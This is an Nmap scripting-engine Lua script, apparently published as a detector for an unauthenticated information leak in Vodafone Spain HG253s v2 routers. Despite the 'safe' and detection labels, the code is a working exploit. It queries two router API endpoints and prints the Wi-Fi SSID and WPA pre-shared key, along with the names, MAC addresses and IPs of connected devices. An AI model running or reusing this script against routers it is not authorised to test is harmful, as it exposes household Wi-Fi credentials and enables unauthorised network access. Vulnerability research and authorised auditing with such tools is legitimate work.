-- The Head Section --
description = [[Script to detect the pre-schooler vulnerability from HG253s v2 Vodafone Spain.]]
author = "@vicendominguez a.k.a |QuasaR| and modified by @danilabs"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"default", "safe"}

local shortport = require "shortport"
local http = require "http"
local stdnse = require "stdnse"
local string = require "string"
local json = require "json"
local table = require "table"

-- The Rule Section --
portrule = shortport.portnumber({80, 443})

-- The Action Section --
action = function(host, port)
    local out = {}
    local options = {header={}}
    options['header']['User-Agent'] = "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"

   -- Leak  wifi information
    local uri = "/html_253s/api/ntwk/WlanBasic"
    local response = http.get(host.ip, port.number, uri, options)

    if ( response.status == 200 ) then
        local body = string.match(response.body, "%*(.*)%*")
        if ( body ) then
          local status, info = json.parse (body)
          if ( status ) then
             table.insert(out, string.format("SSID: %s (%s) Password: (%s) %s", info[1].WifiSsid,info[1].WifiBSsid, info[1].WpaEncryptionMode, info[1].WpaPreSharedKey))
          end
       end
    end

     --Leak list devices
    uri = "/html_253s/api/system/hostinfo?type=wifihost"
    local response = http.get(host.ip, port.number, uri, options)

    if ( response.status == 200 ) then
        local body = string.match(response.body, "%*(.*)%*")
        if ( body ) then
          local status, info = json.parse (body)
          if ( status ) then
            for i,v in ipairs(info) do
             table.insert(out, string.format("Device: %s MAC: %s IP: %s", info[i].HostName, info[i].MACAddress, info[i].IPAddress))
           end
          end
       end
    end
    return stdnse.format_output(true,out)
end
